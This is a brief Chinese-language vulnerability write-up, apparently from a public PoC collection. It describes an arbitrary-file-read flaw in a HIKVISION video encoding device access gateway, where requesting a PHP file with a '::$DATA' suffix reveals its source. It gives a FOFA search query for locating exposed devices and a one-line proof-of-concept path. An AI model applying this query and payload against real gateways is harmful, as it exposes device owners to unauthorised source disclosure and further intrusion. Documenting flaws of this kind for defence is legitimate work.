# HIKVISION 视频编码设备接入网关 $DATA 任意文件读取

## 漏洞描述

HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码

## 漏洞影响

```
HIKVISION 视频编码设备接入网关
```

## FOFA

```
title="视频编码设备接入网关"
```

## 漏洞复现

登陆页面

![image-20220519174129368](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191741462.png)

POC

```
/data/login.php::$DATA
```

![image-20220519174235421](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191742487.png)